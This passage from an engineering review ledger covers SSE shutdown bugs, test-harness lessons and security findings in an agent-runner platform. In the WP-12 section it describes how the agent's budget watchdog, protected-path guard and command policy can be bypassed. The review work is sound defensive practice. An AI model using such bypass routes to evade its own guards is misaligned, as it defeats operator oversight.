instrumentation that could not observe what it certified.

Two further things worth copying. First, the implementer **measured the fix the reviewer and I relayed
instead of applying it**: `#queued >= cap + replayOutstanding` turns out to be arithmetically identical to
the broken `#queuedLive >= cap`, and closed at the same frame 513. The fix that works gates on *growth* past
`#openingBacklog` — the queue depth sealed at the end of `open()` — because a stream that opened at 765 and
still holds 765 is keeping up, while one that has grown past its start by more than the cap is not. Second,
told to hunt a fourth layer, they found **three**: `shutdown()` awaited the whole chain unbounded, so one
stalled reader held `preClose` to the 30s process grace and starved every later step; `publish()` kept
fanning out during shutdown, making the drain a moving target; and `#buffers` was unbounded.

**Five layers, four readers, one shape.** The tally is worth keeping because it is the clearest example in
this repo of a defect class rather than a defect: (1) the cap rejected replay frames; (2) the cap's counter
was shared with replay; (3) replay and live shared the write chain; (4) three more found by the implementer's
own audit — an unbounded shutdown drain, publishes continuing during shutdown, an unbounded buffer map; (5)
the `shutdown` control frame *also* rides the shared chain, and `shutdownDrainMs` is a budget replay and
control share, so a healthy slow client is cut off in silence during shutdown.

Every one is "replay and live share a quantity". Four different readers each fixed the layer in front of them
and each left the next, because each fix was correct. The instruction that finally worked was not "fix this
bug" but **"enumerate every shared quantity between the replay path and anything else, and either fix it or
write down why it is safe"** — a list, not a patch.

Also recorded from this round: the reviewer's own implementation of the relayed fix confirmed it was
algebraically identical to the broken gate (`#queued >= cap + replayOutstanding` ≡ `#queuedLive >= cap`,
same frame 513), and the implementer's new suite fails **8** tests against the shipped `d60d770`, not the 3
they claimed — the tests detect more of the shipped defect than their author realised.

**The rule this earns, and it is the most transferable thing in the ledger:** when a defect keeps returning
one layer down, stop fixing the code and audit the instrument. Ask of every fake: *is it kinder than the
real thing, and can it even reach the state my assertion is about?* A green assertion is worth exactly as
much as the harness's ability to produce the failing state — and a positive assertion (766 frames arrived)
fails loudly on a broken harness while a negative one (`closed === false`) passes silently on the same
wreckage.

### Notes WP-06 must honour (from the architect)

- Nothing calls `registerPartitionMaintenance` yet, so WP-03's daily partition cron never runs. Its returned
  `JobWorker.stop()` must join graceful shutdown.
- pg-boss shares the app pool via `asJobsDatabase`, so `InsufficientPoolError`'s `2C+1` is a **dispatcher
  floor only** — size the pool above it for pg-boss workers and maintenance.
- Pass pino as pg-boss's `onError`; `boss.start()` requires the `pgboss` schema already installed by
  `migrate` (`migrate:false, createSchema:false`).
- A handler that captures the bus and calls the public `dispatch()` self-deadlocks at C=1 — only chained
  events inherit the slot. Put this in the handler docs.

### Notes WP-15 must honour

- **`enqueue` is not in the handler's transaction.** Enqueue after commit, re-validate on fire.
- MR-comment batching: `stately` + `singletonKey: 'mr:<iid>'` + `startAfter: now + 2 min`, and the handler
  re-reads every unresolved thread. Never `coalesce` — the pair with `startAfter` is rejected by the port,
  and both coalescing modes are leading-edge.
- Treat `coalesced` as a success result, and let the handler tolerate finding nothing to do: there is no
  cancel, because timers re-validate.
- `2 × concurrency + 1` holds only while a handler opens at most **one** transaction.

### Checkpoint 1 — after 8 commits (WP-00…WP-05 + WP-02a + ci-fix), 2026-09-09

**What works end to end.** Nothing user-facing yet — M1's foundation is complete but not wired. Concretely:
a pnpm monorepo with the clean-architecture rings and an import-boundary lint that enforces them; every
platform boundary typed in zod and published as JSON Schema; the domain's aggregates, state machines,
policies and permissions as pure functions; a PostgreSQL 18 schema of 45 tables with monthly partitions, a
least-privilege runtime role and an advisory-locked migrator; an event store with a priority dispatcher,
idempotent handlers, per-stream ordering and a transactional outbox; and a jobs runtime on pg-boss with a
working-day calendar. Verification runs in four tiers, the integration tier against a real Postgres
container in ~9s, and CI is green on every gate.

**What is missing.** Everything above the ports: no HTTP server (WP-06), no integrations (WP-07…WP-11), no
Claude runner (WP-12), no run shim or workspaces (WP-13, WP-14), no pipeline interpreter (WP-15), no UI
(WP-20). Nothing in the repository can execute a shell command or call an LLM yet.

**Quality signal.** Seven work packages took **eighteen review rounds** between them. The reviews were not
ceremony: they found two privilege escalations in the database layer (both demonstrated by exploit, one
letting a `CONNECT`-only role destroy a transcript partition, one letting the app role forge a duplicate
event sequence number), fifteen routes to `allow` in the command policy, a dispatcher whose pool exhaustion
was a **permanent silent hang**, a semaphore that admitted two handlers at a limit of one, two drain loops
where the design called for one, a `debounce` that fired immediately, four places where a test fake was
kinder than production, and a literal NUL byte that made a source file binary to git. **Not one of these was
found by reading the diff.** Each needed an exploit, an adversarial corpus, a constructed interleaving, a
removed collaborator, or a mutation of the fix itself.

**Rules this checkpoint earned**, all recorded above with their evidence: a fake may be stricter than the
real adapter, never kinder. A wall-clock assertion is a hardware assertion, not a correctness one. A
comment, an error message or an `.env.example` line asserting an invariant is not evidence it holds. A
differential result is evidence about the corpus, not the program. Green in a worktree is not green on
`main`. And the instrument matters: WP-04's semaphore defect is invisible to a real-Postgres test and only
appears under an in-memory microtask probe.

**Process corrections made:** the protocol's `pnpm -s verify` is `pnpm run -s verify` on pnpm 12; three
implementers plus reviews saturate a 14-core host and make timing tests lie, so concurrency is capped at
two or three; `OPEN-QUESTIONS` numbers and migration filenames collide when worktrees run in parallel, and
the orchestrator renumbers at merge.

**Docs amended from implementation** (docs win, so each was corrected in the record first): technical/02
gained `run.created` and an envelope-`actor` clarification; technical/03 gained the `feedback` table,
`events.id`/`cause_event_id`, a corrected index and a stage-nullability note; technical/12 gained
`features.shadow_mode`; BD-007, product/04 and technical/01 had "2-minute debounce" corrected to a fixed
window; and **TD-004 was amended** to drop `dispatch(event)` as a pg-boss workload and to retract its
"transactional enqueue" claim, which the adapter cannot provide.

### WP-06 — two findings worth remembering beyond this WP

**1. `.gitignore` silently swallowed a source file.** `apps/server/src/data/identity-queries.ts` was matched by
an unanchored `data/` rule meant for a local data directory at the repo root. Everything was green locally
because the file existed on disk; the commit would have landed a tree that does not typecheck, and CI would
have been the first thing to notice. **`git add -A` does not warn you about this** — the orchestrator's own
merge would have shipped it. Rule: an ignore pattern for a repo-root directory must be anchored (`/data/`,
not `data/`), and a WP that adds a new source directory should run `git check-ignore` over its own change set
before reporting DONE. `*.log` is unanchored for the same reason and should be checked.

**2. A whole test tier was proving less than it appeared to.** `@better-auth/core`'s `isTest()` sets
`skipOriginCheck = true`, so **every e2e test runs with Better Auth's origin check disabled**. The e2e suite
therefore says nothing about CSRF on `/api/auth/*`, while looking exactly like it does. The reviewer only
found this by standing up an out-of-test instance against a real Postgres — where the defences turned out to
be sound. Generalisation for later WPs: *a library that detects test mode changes what your tests cover*, and
security behaviour in particular must be verified with `NODE_ENV=production` at least once, not inferred from
a green suite.

**3. Completeness is a different assertion from ordering.** The SSE hub's replay dropped **every** frame when
a reconnect spanned two or more topics — 0 frames delivered at production defaults, the stream closed with no
`reset`, so a client reconnects into the same wall forever. The existing tests asserted ordering and dedup on
the live path and the cap on the live path, but nothing asserted that a replay delivers *all* missed frames.
Two correct assertions did not add up to the one that mattered.

### WP-06a — the SSE write chain, and a harness that cannot see it (carried out of WP-06)

**Why a separate WP.** WP-06's three review rounds were spent, and the same precedent as WP-02a applies: the
round-3 finding is a *newly discovered layer*, not a repeated failure to fix the same thing, and blocking a
working server skeleton would stall WP-07 and WP-20. Nothing publishes to the hub yet, so the defect is
latent — but **WP-12 and WP-15 make it live**, and it must land before them.

**Defect 1 — the third layer of the cap bug.** Rounds 1-3 each fixed a real thing and each left the next
layer: (a) the cap rejected replay frames; (b) the cap's *counter* was still shared, so a replay poisoned the
live budget; (c) replay and live still share the **write chain** `#chain`, so no live frame drains until the
replay has, and `#queuedLive` therefore counts "live frames that arrived during the replay" rather than
consumer speed. Measured at shipped defaults with a paced producer writing at the socket's own rate: 255
replay + 800 live → fine; 510 + 800 → fine; **765 replay + 520 live → CLOSED at frame 514, no `reset`,
connection count 0**; 765 + 400 → fine. Only replay length decides. It dies iff replay exceeds
`maxQueuedLiveFrames` — 3 topics × 256 buffer = 768 > 512 — which is an ordinary browser tab reconnecting on
`org` plus a project plus a task. And because a browser `EventSource` carries one cursor, the other topics
get neither replay nor `reset`. The reviewer's minimal fix: gate on `#queued >= cap + replayOutstanding`
(outstanding only decreases, so a stalled reader still trips it) and write `reset` before `close()`.

**Defect 2 — and this is the more important one. The test harness cannot observe the defect it certifies.**
`settle()` returns after **one** turn without progress. A real socket write costs two macrotasks
(write→false, `'drain'`, completion); make the fake cost two and the *passing* 766-frame test reports **2**.
It fails loudly there only because that assertion is positive — the same detector next to
`expect(closed).toBe(false)` passes silently. The completeness test also injects **one** live frame against a
cap of 512, the minimum possible probe, which is precisely why it cannot see defect 1. **Fix the harness
first, then the code**, or the fix cannot be validated. Three rounds of this bug were each hidden by test
infrastructure that resolved too eagerly, and the implementer twice discovered their own helper could not
observe what it claimed to.

**The lesson, stated plainly because it has now cost three rounds:** when a defect keeps coming back one
layer down, stop fixing the code and go audit the instrument. A green assertion is only as good as the
harness's ability to reach the state being asserted about.

Also in scope: the memory figures are decimal numbers with binary labels (660×256×64 = 10.31 MiB, not
"10.8 MiB"; ×1000 = 10.07 GiB, not "10.5 GiB"); `SOURCE_ROOTS` lacks `'.'`, so a new *untracked* root-level
file under a swallowing rule is caught by neither arm of `check-ignored.mjs`; `#buffers` is never pruned per
topic outside `shutdown`, unlike `#byTopic`; and mutation H's `/events` e2e test kills by a 5s inject timeout
rather than an assertion.

### WP-06a — review round 2: the sixth layer, found exactly where the audit said to look

**Verdict REQUEST_CHANGES**, one blocking finding. The reviewer derived the shared quantities from the code
before reading the ten-entry audit and matched it **10/10** — then found two the audit had missed and one it
stated wrongly, and the blocking defect was in the entry the audit was proudest of.

**The blocking finding.** `hub.ts:465` claims "exactly one of the two paths reaches the wire" of the on-chain
`shutdown` (`:807`) and the off-chain one in `abandon()` (`:540`). False: if the on-chain link is in flight —
past its `#closed` check, awaiting drain — when the deadline fires, **both** write. Reproduced with `drainMs`
20 and the transport slowed for the `shutdown` frame only: the wire was `["ping","reset","shutdown","shutdown"]`,
and because `@fastify/sse`'s `send()` hands bytes to the stream synchronously, a real client sees
**`shutdown, reset, shutdown`** — a `reset` *after* the frame that ends the stream, which is the exact
"client reconnects into the same wall" failure this WP exists to prevent.

**Why it matters beyond this file.** Five layers were "replay and live share a quantity". The sixth is "the
on-chain and off-chain shutdown share *whether the client has been told*" — an obligation, not a buffer or a
counter. The audit enumerated every shared *thing* and missed the shared *fact*. Rules 9 and 10 above are
what this earned.

**The other findings.** Audit entry 7 ("nothing closes mid-replay except `#dropStalled` and `abandon`") omits
three closers — `write`'s `.catch` (`:442`), `SseHub.close` (`:777`), and `open()`'s same-id displacement
(`:617`); all benign, but an audit is worth only its exhaustiveness and this one is trusted. `#byTopic`
(`:563`) is missing entirely: `publish` iterates the `Set` while `#dropStalled → close → #onDropped` deletes
the current element re-entrantly — safe by spec, unstated. `check-ignored.mjs` (rule 7 corollary above).
`config.ts:130` has no refinement that `sseShutdownDrainMs < shutdownTimeoutMs`; both independently reach
600 000, which makes the drain budget meaningless.

**What the round confirmed as sound.** `abandon()` is genuinely off-chain on every path, both writes guarded
by `isConnected`; no cross-connection starvation, because `#chain`, `#queued` and the deadline are
per-connection and all `withDeadline` timers start in one synchronous `map`, so `preClose` is bounded by a
single `shutdownDrainMs` (measured 25 ms at drainMs 20). **All the memory arithmetic recomputed correct**:
255×64+512 = 16,832; ×660 = 11,109,120 B = 10.594 MiB; 512×660 = 330.0 KiB exactly; ratio 32.875 → "33×".
Binary labels now match binary units. **Six mutations, every one killed by a named assertion and none by a
timeout** — growth-gate→depth-cap and `sealOpeningBacklog`→0 each killed 4 (`expected 1 to be 400/520/800`);
`withDeadline`→unbounded killed `expected 'shutdown never returned' to be 'drained 1'`; `abandon`→on-chain
killed `expected ['ping@-'] to include 'reset@-'`; `#evictBuffers`→no-op killed 3 buffer-retention
assertions; removing the publish-during-shutdown guard killed `expected 'steer@run:…' to be 'shutdown@-'`.
No test was weakened and two were strengthened: `routes.test.ts:98` replaced a bare `await inflight` — killed
only by vitest's 5 s timeout, the ledger's mutation H — with a raced deadline plus a named assertion.

**`MAX_STALLED_TURNS = 500` is a disguised threshold, not a proof** ("250 × two turns" is a constant on
elapsed turns; the impossibility argument needs "no timer or external release is outstanding"). It holds
today only because no test `settle`s while a `setTimeout` is the only source of progress. Direction of
failure is safe — false failure, never false pass — so it was filed as a note.

**Round 3 (the last one this WP gets) is in flight**, briefed to reproduce the `shutdown, reset, shutdown`
wire as a failing test *before* fixing it, and to **measure** the reviewer's proposed arbitration flag rather
than apply it — the same discipline that at round 1 proved the reviewer's `#queued >= cap + replayOutstanding`
algebraically identical to the broken gate it was meant to replace.

### WP-06a — review round 3: APPROVE, and the seventh layer found anyway

**Round 3 verdict APPROVE.** The reviewer re-derived all ten shared-state entries and all five obligations
from the code before reading the audit, matched **10/10 and 5/5**, and then found the seventh layer:

**`SseHub.shutdown()` (`hub.ts:939`) is not re-entrant.** Two concurrent calls snapshot the same connections
twice and `write()` enqueues a second `shutdown`; the second link passes both `#closed` and `isConnected` and
writes — measured wire `["ping@-","shutdown@-","shutdown@-"]`. The shape is the point: the on-chain link
*sets* `#shutdownAnnounced` but never *reads* it, so round 2's arbiter does not arbitrate on-chain against
on-chain, and the audit's claim that the two paths "partition the race exactly — no gap and no overlap" is
false because **there are three paths, not two**. Filed as should-fix rather than blocking because the
reviewer measured that it is unreachable through the composition root: Fastify's `preClose` fires exactly
once for both concurrent and sequential `app.close()`, and `runtime.stop():229` has its own guard.

**What round 3 confirmed.** Round 2's implementer was right to measure the proposed arbitration flag instead
of applying it — the reviewer independently ran the mutation the implementer had *not* run (keep the
`shutdown` dedupe but move the flag read past the `reset`s) and killed it with wire `shutdown,reset,reset`,
so the "claim the flag before `abandon()`'s `reset`s" refinement is empirically load-bearing rather than
rhetoric. All five constructed interleavings pass; a stalled plus a healthy connection drain in 22 ms at
`drainMs` 20, i.e. one budget, not two. `MAX_STALLED_TURNS` is **gone** — `settle` now proves hopelessness
structurally (every write parked on a gate only `close()` releases), with `MAX_DRAINING_TURNS = 50` bounding
only the ungated case and the residual unprovable case written down at the constant.

**Two audit omissions remain, both benign:** `#shuttingDown` itself, and `connection.topics`, which
`updateSubscriptions` mutates while `#resetEveryTopic`/`SseHub.close` read it (probed during the drain:
leaks nothing, `watchedTopics: []`).

### WP-06a — the merge found what no worktree could: standing rule 6, exactly as written

Squash-merging the APPROVED branch turned `main` **red**, and nothing in three review rounds could have
caught it. WP-06a's whole contribution to `check-ignored.mjs` was to derive its scope from `git ls-files`
instead of two hand-maintained lists. `.claude/` is a tracked top-level directory, so the derived walk
descends into it — and on `main`, `.claude/worktrees/agent-<id>/` is a **separate git worktree**, a second
checkout of this repository, correctly ignored by `.gitignore:45`. The guard reported every source file in
it and failed `verify`.

It was green in the review worktree for one reason only: that worktree lives outside the repository, so it
contains no nested checkout. **A guard that inspects the repository is a guard whose result depends on where
it is run from** — and the orchestrator's own parallelism is what put a checkout inside the repository.

The fix must not be another list. The non-drifting rule is git's own: **a directory containing a `.git`
entry is a separate repository or worktree, so do not descend into it.** A linked worktree has `.git` as a
*file* (an 84-byte `gitdir:` pointer); a nested clone has it as a directory; handle both. `.gitignore:45` is
also unanchored (`.claude/worktrees/`), which violates this repository's own convention — anchored to
`/.claude/worktrees/` as well, though that is *not* the fix: anchoring changes which pattern matches, not
whether the walk enters another checkout.

Both this and the round-3 should-fix went out in one short follow-up round, with a test for each that must
fail by a **named** assertion when the fix is reverted. The nested-checkout test builds a real linked
worktree rather than a directory *named* `worktrees` — a test that asserts the walk skips a name tests
nothing — and asserts in the same run that a genuinely swallowed source file still **fails**, so it cannot
pass by the guard having been switched off (standing rule 4: a negative assertion passes silently on a
broken harness, so pair it with a positive one).

### WP-07 — review round 1: the fakes are the product, and rule 1 is decided here

**Verdict REQUEST_CHANGES**, three majors. WP-07 is where standing rule 1 stops being advice: five fakes
become the unit-tier ground truth for WP-08…WP-11, WP-15 and the whole pipeline, and the implementer
declared **six groups of "kinder than production" divergences** openly. The reviewer's job was to price each
one. Verdicts: task-management acceptable · **git must be made stricter** · communication acceptable ·
errors acceptable · logs acceptable · application-ring doubles acceptable.

**Major — a secret reaches the log.** `action-executor.ts:352`: the audit-**failure** branch logs
`err: errorMessage(error)` unredacted, while `:232` redacts the same string for the audit row. The WP's own
test at `action-executor.test.ts:180-201` proves an error message can carry an injected token. The redaction
is present on the path that succeeds and absent on the path that fails — TD-012 and BD-002 both violated by
the same omission. Treated as a *class* in the fix brief: every site where an error, a provider payload or a
response body is logged, thrown or attached to an event rather than written to the audit row.

**Major — the shadow guard fails open.** `action-executor.ts:86,274`: `mode` is optional and defaults to
`'normal'`, so a call site that forgets `mode: task.mode` — WP-15 makes these calls — gets a **real** side
effect where shadow mode was intended. In shadow mode no side effect may reach a provider; a safety guard
whose default guesses "not shadow" is inverted. The file's own docblock already argues for making
`shadowResult`/`describeResult` required; the argument applies harder to `mode`.

**Major — the shared suite bakes in the wrong error code.** The git fake throws `invalid_request` for a
duplicate open MR (`fake.ts:661`); its own register says `conflict` (`fake.ts:18`) and `common.ts:69` maps
GitLab's real **409 → `conflict`**. `git-provider-contract-suite.ts:191` asserts the fake's code, so WP-09
must either mis-map a real 409 or weaken the suite — both defeat a shared suite. Found only by reading
`common.ts`: the register and the code disagreed and nothing failed.

**The kindest divergence in the WP was untested.** Hard-coding `mergeable: true` at `git/fake.ts:365` passes
**39/39** unit and contract tests. "Mergeability is whatever the seed says" is exactly the divergence WP-26's
rebase gate will trust, including the `null` case.

**And five registers justified a kindness by pointing at tests that do not exist.** All five fakes explain
"no quota unless scripted" with "the scripted path is what the executor's tests drive" — the executor's
tests use lambdas, and **nothing anywhere composes a fake with `IntegrationActionExecutor`**. The rate-limit
path is therefore unexercised by default in every unit suite that will trust these fakes, while the register
says the opposite.

**Rules earned:**
11. **A register entry that justifies a kindness by pointing at a test elsewhere must name a test that
    exists.** A justification is a claim about the suite, and claims about the suite are checkable.
12. **A fake's kindest divergence needs a positive assertion, not a warning.** Documenting a divergence is
    necessary and not sufficient: the one place a fake is most permissive is the one place a later WP will
    lean hardest, so it needs a test that fails when the divergence widens.

**Also found:** the "shadow mode null adapter" named in WP-07's plan line and referred to by
`integrations/index.ts` and `task-management/fake.ts:3` **is implemented nowhere** — shadow mode is a guard
inside the executor instead. Two suite assertions are still fake-shaped and are the first thing WP-08 would
have to change (`task-management-contract-suite.ts:269`, where real Jira yields `unsupported_event` rather
than `malformed_payload`, and `git-provider-contract-suite.ts:275`), which is a direct BD-017 violation.
`IntegrationActionEntry` carries five fields `integration_actions` has no columns for (`0007_cost.sql`,
technical/03:70) — recorded in `docs/TODO.md` rather than fixed, because no adapter persists them yet and
parallel WPs collide on migration numbers.

**Confirmed sound:** the dependency rule holds and the biome overrides were extended rather than weakened;
`parseProviderData` sits at the ring edge (BD-022); caps are strict; idempotency scope, replay and
audit-before-throw are correct apart from the redaction gap; tiering and coverage correct; **all five doc
amendments to technical/06 are doc-proven-wrong rather than doc-found-inconvenient**, and the audit
row/event split matches technical/02:120.

### WP-07 — review round 2: APPROVE, and four leaks built against the real serialiser

**Verdict APPROVE**, three should-fix items, no blockers — all five fixed before the merge rather than
filed, because the next four work packages are the ones that make them reachable.

**Round 2's own work was good.** Major 1 was treated as a class rather than a line, and the site that
mattered was not the one the review named: the **rethrow**. The error escapes the executor into
`apps/server`'s `{ err }` handler, so redacting the audit row was never enough; `redactErrorInPlace` now
scrubs message, stack and the whole `cause` chain in place while preserving error identity. Major 3 widened
usefully — re-reading all 17 suite assertions found two that were adapter *obligations* no port stated
(`cloneUrl` refusing a revoked credential, Slack's `channel_not_found` arriving as `200 {ok:false}`), now
moved onto the ports so WP-09 and WP-10 learn them from the contract instead of from a red suite. And
`Object.freeze` turns out not to seal `stack` at all — V8 exposes it as a prototype accessor.

**But the reviewer constructed four working leaks**, each verified against the **real**
`pino-std-serializers@7.1.0` the server uses rather than against the redactor's own tests: own enumerable
fields are never walked (`err.js:29-38` copies every `for…in` key, so an axios-shaped
`config.headers.Authorization` survives into `util.inspect`, `JSON.stringify` and the pino err object);
`AggregateError.errors[]` is never walked (`err.js:24-26`); and a `cause` chain deeper than the redactor's
`MAX_CAUSE_DEPTH = 8` returns `count=0` while pino's `messageWithCauses` walks it unbounded. **None is
reachable from code shipped in WP-07** — all five fakes throw `IntegrationError`, whose own fields are
`code`/`provider`/`action`/`retryable`, and pino skips a *cause's* own fields — which is precisely the
argument for fixing it now: WP-08…WP-11 introduce real provider SDK errors, and an axios or undici error
carries the credential as an own enumerable field.

**The shadow guard still failed open at runtime.** Round 1 made `mode` required in TypeScript; the reviewer
probed it live and a JavaScript caller omitting `mode` — or passing `'SHADOW'` for `'shadow'` — got
`status: ok` and a real `perform()`. Round 1's mutation had died as `TS2578`, which proves the compiler and
not the code. Rules 13 and 14 above are what these two earned.

**"The redaction is on one branch and not the other" recurred a third time in one file** (`:443` rethrows
`auditError` unscrubbed while `:449` scrubs it), so the fix round was asked not just to patch it but to name
what would prevent a fourth — a choke point, a lint rule, or a type that cannot be thrown unredacted.

**The reviewer's independent count of unredacted-text sites was 13, not the 7 examined.** They agreed the
two deferred gaps are correctly deferred — there is no write path to `events.payload` yet, so "redaction at
write" has no write to attach to — but made the better point that the obligation belongs on
`IgnoredDelivery.detail` and `HealthProbe.detail` themselves, where WP-08 will meet it, not only in a
backlog file nobody opens while coding.

**Confirmed sound:** `describe.each` genuinely drives `failNext(429)` through all five fakes and asserts
`core.calls === 2` for each (rule 11 discharged); every register citation names a test that exists; each
fake's kindest divergence carries a positive assertion, mergeability included, with `null` distinguished
from `false` for WP-26's rebase gate; suites are structurally reusable, the harness supplying ids, statuses,
deliveries and even the ignore reason, with the first remaining friction being fresh-context-per-test
against recorded cassettes; no third-party dependency added; biome overrides correct; ports strict-zod and
snake_case; `secretFields` guarded at registration. The shadow-null-adapter removal was judged sound on the
right grounds — a null adapter bypasses the executor and writes no `would_have` row, which product/12's
ShadowReport needs.

**Discovered work:** nothing connects `ProviderCreateInput.secrets` to `exactSecretRedactor`, so WP-15 can
hand a provider a secret the redactor never learns — and `redaction_count`, the only signal that would show
it, has no column yet.

### WP-12 — review round 1: two guards that fail open, and an SDK read that was right

**Verdict REQUEST_CHANGES.** Both majors are demonstrated rather than argued, and both fail **open** — the
direction where a green suite means nothing.

**The budget watchdog is defeated by one missing field.** The reviewer replayed the `happy-path` fixture with
`total_cost_usd` deleted from the `result` line — the SDK passes that field through **unvalidated** — and got
`status=completed`, `terminalReason=success`, `cost.usd=NaN`, `maxBudgetUsd=0.01`, watchdog silent, because
**`NaN > 0.01` is false**. The transcript's `result` row is replaced by a `transcript_normalisation_failed`
row, so the only loud signal is a different row from the one the pipeline reads, and `NaN` flows on into
WP-19's ledger. WP-12's own docblock states the principle it violates — *"'the vendor enforces it' is a claim
about a binary the platform ships but does not control"* — and **WP-13's `agentic-runlet` is the untrusted
producer of this stream**, so it is not a hypothetical about a well-behaved CLI.

**The path guard inherits the filesystem's equivalence classes.** Matching is case-sensitive, so with
`protectedPaths: ['infra/**', '.env']` it returns `allow` for `.ENV` and `INFRA/main.tf` and no flag for
`.CLAUDE/settings.json`. The reviewer then **wrote `.ENV` on an APFS volume and overwrote `.env`**. Protected
paths have **no container backstop** — the mount is writable — so this guard is BD-024's only enforcement and
it fails open on `local` mode and on every macOS or Windows bind mount. Thirty-one other constructed inputs
did *not* escape: `..` in several encodings, deep `..`, absolute, `/proc`, `/dev`, `..%2f`, backslash, `~`,
`.`, empty and whitespace all deny, and `%2e%2e` and fullwidth dots stay inside as literal names.

Rules 15 and 16 above are what these two earned.

**A second silent shadow of `canUseTool`.** `settingSources: ['project']` loads the workspace's
`.claude/settings.json`, whose permission-allow rules shadow the callback — the SDK says so in the same
warning string the implementer had already acted on — and whose hooks run commands that never reach
`evaluateCommand`, bypassing the command policy WP-02 and WP-02a spent three review rounds and fifteen closed
`allow` routes building. BD-025 limits the blast radius to the project owner's own default-branch file, which
is why it was should-fix rather than blocking, and the SDK offers the exact remedy
(`managedSettings.allowManagedPermissionRulesOnly` / `allowManagedHooksOnly`).

**Standing rule 11 fired again, in the second consecutive work package.** A fake's divergence register cited
`claude-runner.sdk.test.ts`, which does not exist. The substance held — the real `query()` *is* driven
through `fakeSpawnClaudeCodeProcess` in `claude-runner.test.ts` — so it was a stale name, but that is exactly
the failure rule 11 names, and two WPs in a row is a pattern rather than a slip.

**What the review confirmed as sound**, and it is most of the WP. The `allowedTools` reading is **correct and
in the dangerous direction**: `sdk.d.ts:1443-1449` documents it as an auto-approve list, the shipped bundle
emits `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` — *"bare `allowedTools` entries auto-approve the whole tool before
the callback is consulted"* — and the reviewer found **no remaining path** that sets it, with a mutation
re-adding it dying on a named test. All four SDK divergences check out against the declarations and the
bundle, so all four amendments to technical/04 are earned. Redaction is on **both** branches everywhere —
`append` is the single door and re-applies the envelope over the redacted copy — with none of the
WP-07-style asymmetry. The clock is injected everywhere, with zero `setTimeout` or `useFakeTimers` in the new
tests. Both SDK workarounds are correct and neither swallows an error. The fixtures are replayed through the
**real** `query()`, so the SDK's own parser validates their shape. Eleven original mutations plus four the
reviewer invented all die by named assertions, none by timeout. The redaction-port merge collapse is complete.

**Q40 — the unredacted session mirror — is a genuine question, not a permissive fait accompli.**
`SessionMirrorPort` has no adapter, no table, no migration and no composition-root wiring; `deps.sessionMirror`
is optional and nothing supplies it, so today's exposure is zero. The reasoning is also right: redacting the
mirror corrupts `resume`. But `session-mirror.ts:15-17` promises "same database, same access control, never
rendered to a human" — an invariant asserted in a comment (rule 3) and unimplemented. **Whoever writes the
adapter owes that access control, and WP-27's take-over export owes the redaction.**

**Also worth keeping:** `fake-spawn`'s "no backpressure" kindness is genuinely inert inside WP-12, because the
SDK owns stdout — but **WP-13 must not run its "large stdout" conformance test against this fake.**

### WP-08 and WP-09 — two providers, and what "recorded" turned out to mean

Both were implemented in parallel from published documentation, because there is no Jira or GitLab instance
to call. Both were told to report **which fixtures are documented and which are invented, separately**, and
both did — that instruction is the reason the two reports can be trusted at all.

**WP-08 (Jira Cloud): 12 documented, 2 composed, 0 invented.** Every fixture carries a `source` block with a
URL and a retrieval date, and the taxonomy lives in `test/fixtures/http/jira-cloud/SOURCES.md`; the two
`composed` entries exist because Atlassian publishes the webhook envelope and the parts but no complete
example. The published HMAC test vector was reproduced exactly. Two Atlassian documentation bugs were found
and recorded (`getIssue`'s `fields.comment` array shape, and an `accoundId` typo). **The contract suite
passed unchanged** — the first evidence that BD-017 actually holds. One mutation is worth keeping: raw probe
detail → "redacts the health probe detail" **initially survived**, because the *executor's* redactor was
masking the adapter's own; the test now composes `noSecretsRedactor()` so only the adapter's can fire. That
is standing rule 4 in a new costume — a guard that appears to work because a *different* guard is covering
for it.

**WP-09 (GitLab): documented fixtures plus five explicitly labelled `kind:"inferred"`** (the 409 body for a
duplicate MR — status documented, body not; a 404 for an unprotected branch; a 404 for a missing file; an
empty pipeline list; a repeat-200 on a second resolve). Coverage type is flagged AMBIGUOUS in the fixture,
because the docs only ever show `null`. `merge_status` maps to the port's three states with
`unchecked|checking|cannot_be_merged_recheck` → **null**, never `false` — the distinction WP-26's rebase gate
depends on — and blocking reasons never map to `false`. Thirty mutations, all killed by named assertions.
Self-managed differences are handled as capability flags rather than version sniffing, with minting failures
turned into a typed `unsupported_capability` that names Premium/Ultimate rather than surfacing a raw 404.

**What WP-09 deliberately did not invent, and this is the right instinct:** `diff_stats` is `null`
everywhere, because GitLab's REST API publishes only `changes_count` (a file count, and `"1000+"` above a
thousand). Filling two of three fields with zeroes would have put invented numbers into `mr.opened` and into
WP-39's coverage deltas. GraphQL's `diffStatsSummary` has them — recorded as discovered work.

**Q40 collided, exactly as predicted.** WP-09 and WP-12 both took it. WP-09 saw the hazard coming and noted
that a collision would conflict on the same hunk, "which is the loud failure" — the orchestrator renumbers at
merge. WP-08 took none.

**WP-09's finding for the pipeline:** `GitProviderPort` has **no protected-branch member**, so WP-15 would
have to down-cast to `GitLabProvider` to reach the gate WP-09 provides. GitHub has the same concept. It
belongs on the port, with a fake and a suite case, in a follow-up.

### A hardware assertion survived seven layers of review, and WP-08 found it

`apps/server/src/sse/hub.test.ts:1101` drives a real `shutdownDrainMs: 20` — twenty actual milliseconds — and
asserts the **exact** 264-frame wire that drains inside it. How many frames drain in twenty real
milliseconds is a property of the machine. This is **standing rule 2**, in the file that earned rules 9, 10,
15 and 16, and it passed three WP-06a review rounds and a follow-up.

It was found only because WP-08's 157 new tests loaded the runner enough to tip it over: red **3 runs in 8**
with those files present, green **8 of 8** with them moved aside. The orchestrator could not reproduce it on
`main` — 6 of 6 green in isolation, 5 of 5 green across the full unit and contract suite — which is the
point worth recording: **`main` was not flaky, it was one work package away from being flaky**, and WP-08,
WP-09 and WP-12 land roughly 560 tests between them.

**Fixed and verified** (`ci-fix`, merged to `main`). The implementer reproduced it before touching anything —
28 spinning processes on a 14-core box, then the file six times: **1 green, 5 red**, wire lengths 55/91/111/210/248
against 268 — and then **injected the timer rather than loosening the assertion**. `withDeadline`'s `setTimeout`
is the hub's only clock, so `vi.useFakeTimers` hands the test the moment the deadline fires; a new
`stalledOnGate` helper drives the chain to the one place it cannot leave and only then advances 20 ms. The
wire is still asserted **exactly and in order**, with a new pre-deadline assertion that the drain stopped
partway, and `withinTurns` bounds the drain in event-loop turns rather than milliseconds. `hub.ts` untouched.

The orchestrator verified it independently under 24 spinning processes: **6 of 6 red before the fix**
(`expected [ …(59) ] to deeply equal [ …(268) ]` and four more like it), **0 of 8 red after**, same load. And
a mutation of the orchestrator's own — making `#resetEveryTopic` return early — still kills three tests by
name, including the repaired one (`expected [ …(265) ] to deeply equal [ …(268) ]`), so the fix did not pull
